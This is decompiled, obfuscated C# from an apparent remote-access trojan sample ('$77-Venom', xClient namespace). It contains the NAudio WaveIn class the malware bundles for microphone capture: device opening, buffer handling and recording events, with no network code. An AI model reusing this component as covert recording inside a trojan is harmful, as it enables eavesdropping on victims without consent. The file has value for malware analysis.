// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInputs.WaveIn
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave.WaveInputs
{
  public class WaveIn : IWaveIn, IDisposable
  {
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;
    private readonly \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.磘\uFFFD쁚僻\uFFFD枦뚖筳筘\uFFFD\uE2B8섎뱆攧뼲澡툾矅ჱ\uFFFD callback;
    private 剓ꇝ钏䌢\uFFFDꯦ낥\u26CF\u0384芷ᵰ떯ꄦ篑\u2E14쮜㘝䜕Ꮗ먖 callbackInfo;
    private readonly SynchronizationContext syncContext;
    private int lastReturnedBufferIndex;

    public event EventHandler<䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ> DataAvailable;

    public event EventHandler<눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑> RecordingStopped;

    public WaveIn()
      : this(剓ꇝ钏䌢\uFFFDꯦ낥\u26CF\u0384芷ᵰ떯ꄦ篑\u2E14쮜㘝䜕Ꮗ먖.\uFFFD\u2FC7뛏䰊\u32C3\u2510晗볚蹳톎㦒ⷎ羧\uF51A\u32B6ꈺ몯檕㵰辑())
    {
    }

    public WaveIn(IntPtr windowHandle)
      : this(剓ꇝ钏䌢\uFFFDꯦ낥\u26CF\u0384芷ᵰ떯ꄦ篑\u2E14쮜㘝䜕Ꮗ먖.\uFFFDㅗ֥\uFFFD酑㖀嶪\uE603䲊Ṱ\uFFFD챳\u28B8跽샫춺솳ዝ榙Ⴄ(windowHandle))
    {
    }

    public WaveIn(
      剓ꇝ钏䌢\uFFFDꯦ낥\u26CF\u0384芷ᵰ떯ꄦ篑\u2E14쮜㘝䜕Ꮗ먖 callbackInfo)
    {
      this.syncContext = SynchronizationContext.Current;
      if ((callbackInfo.Strategy == 唾峡\u27BA넚搫ↀ\uF10E觇暎꿢캋途杉\u21D5睠铞騱爺踃퓞.릪쮰\uE500鹣㜔䑧圮坪ꨬⅫ짹䉘\uE44B襹準뾉췊ቱ逻塍 || callbackInfo.Strategy == 唾峡\u27BA넚搫ↀ\uF10E觇暎꿢캋途杉\u21D5睠铞騱爺踃퓞.쵣\u3336傪㞠ⅱ\uEFF9\uE1B4쇱妯\u173DŴ屪ࠇᅩ沦铎쾳褂즔\uFFFD) && this.syncContext == null)
        throw new InvalidOperationException("Use WaveInEvent to record on a background thread");
      this.DeviceNumber = 0;
      this.WaveFormat = new \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
      this.callback = new \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.磘\uFFFD쁚僻\uFFFD枦뚖筳筘\uFFFD\uE2B8섎뱆攧뼲澡툾矅ჱ\uFFFD(this.Callback);
      this.callbackInfo = callbackInfo;
      callbackInfo.룠佋\u082F\u2953柲ꋂ䒋䊹챂\uFFFD甔喘\uE55C켚ꎼ퐠젖僜팪ଞ(this.callback);
    }

    public static int DeviceCount => \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.\u28D6䖠ᖷơ\u09B4㙘헇\uFFFD繵\uE95F䅣軲䇍\u240C쒸ﵩវﬅ쭍锕();

    public static ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨 GetCapabilities(
      int devNumber)
    {
      ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨 waveInCaps = new ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.䓠軣㔡ꀵ㬏ﳷ閗瘗涉\uFFFDﲔ觛춇\uFFFD뾚ຄ徕珊\u1A9Fഒ((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void Callback(
      IntPtr waveInHandle,
      \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.兵\u2BD4䟰喇\uF61D\u26A7闍쬚㽮恌枠\u2200보趥㨄燺鶏䇬\uEA18\u2AB9 message,
      IntPtr userData,
      ㄇ\uF112穧箰咽\u31DC첞闩倕\uFFFD鵊\uE0C8糒믕㞠픟\u1AEF囲妛ꗢ waveHeader,
      IntPtr reserved)
    {
      if (message != \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.兵\u2BD4䟰喇\uF61D\u26A7闍쬚㽮恌枠\u2200보趥㨄燺鶏䇬\uEA18\u2AB9.訉ྥ\u2019찫隄\u2FB5왆䎹逦轝뼧\uEAD5\u22E7뚲\uEA8D화뀃ꭞ\uFFFD匝 || !this.recording)
        return;
      WaveInBuffer target = (WaveInBuffer) ((GCHandle) waveHeader.\uE217\uF382ꕐ禤棣\uF695ऽ讏ꅆ䔘閖㸾\u2545㡌୫塊\u27D4먰扵ᯁ).Target;
      if (target == null)
        return;
      this.lastReturnedBufferIndex = Array.IndexOf<WaveInBuffer>(this.buffers, target);
      this.RaiseDataAvailable(target);
      try
      {
        target.Reuse();
      }
      catch (Exception ex)
      {
        this.recording = false;
        this.RaiseRecordingStopped(ex);
      }
    }

    private void RaiseDataAvailable(WaveInBuffer buffer)
    {
      EventHandler<䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ> dataAvailable = this.DataAvailable;
      if (dataAvailable == null)
        return;
      dataAvailable((object) this, new 䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ(buffer.Data, buffer.BytesRecorded));
    }

    private void RaiseRecordingStopped(Exception e)
    {
      EventHandler<눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑(e))), (object) null);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(this.callbackInfo.㔿䦋縪撟뿵\u2A88ኘ︈盎嘛鎩\u2EFF\uE220㳼\uFFFDદ\uEFD4칪㐃麕(out this.waveInHandle, this.DeviceNumber, this.WaveFormat, this.callback), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      this.EnqueueBuffers();
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.\uE0E2\uFFFD\uE988㝣怫밤憲霨ᩗ娘䤒Ꮓؙ粓\u27B2헣里㸎መ\uF25B(this.waveInHandle), "waveInStart");
      this.recording = true;
    }

    private void EnqueueBuffers()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
    }

    public void StopRecording()
    {
      if (!this.recording)
        return;
      this.recording = false;
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.噫짣쉍됓괽땫꼽똃煷鰙\uE555ﶽҸﶌ\uECEC\uFFFD\uEF18\uF2B6쫶ᚁ(this.waveInHandle), "waveInStop");
      for (int index = 0; index < this.buffers.Length; ++index)
      {
        WaveInBuffer buffer = this.buffers[(index + this.lastReturnedBufferIndex + 1) % this.buffers.Length];
        if (buffer.Done)
          this.RaiseDataAvailable(buffer);
      }
      this.RaiseRecordingStopped((Exception) null);
    }

    public \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
      if (this.callbackInfo == null)
        return;
      this.callbackInfo.䐫諚今湫섫씲ሢ讳\u2893蝛\uE48Aᆁ\uF2D9鳰掍뛘嚥戎㩸急();
      this.callbackInfo = (剓ꇝ钏䌢\uFFFDꯦ낥\u26CF\u0384芷ᵰ떯ꄦ篑\u2E14쮜㘝䜕Ꮗ먖) null;
    }

    private void CloseWaveInDevice()
    {
      if (this.waveInHandle == IntPtr.Zero)
        return;
      int num1 = (int) \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.曘㭼䑬\u2FC3쐦\uF526\uA4CB鉰ৢ銀誔ﭟ峠䖥曵렲笮လ覬\u2ACF(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.㡚긓\uFFFD\u205B\u2BDDᩂﷷ먡끋ᢈ黽曐ᷯ敔籤᷎缑㒍焠\u9FF1(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍 GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍((IntPtr) this.DeviceNumber, 0, 撩鈕\uF10FӔ黒\u1AE2ծ塐᧘\uF859齍ᬂ쵹д揼笕\uE703룤\uE976豶.\u25B4脶ኛⳏ笗\uF723ﲒ\u0FDA媟푞坬\uEA56\uFFFD纈샾循\u27C5駝鞲휊) : new \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍(this.waveInHandle, 0, 撩鈕\uF10FӔ黒\u1AE2ծ塐᧘\uF859齍ᬂ쵹д揼笕\uE703룤\uE976豶.ꤿ㚦閈\uEDD9儾骖巆ꢦ\u9FFE\uF29A讧\uFBB9鈥\u2EE3殄탯֮쳛襇\uF7DA);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
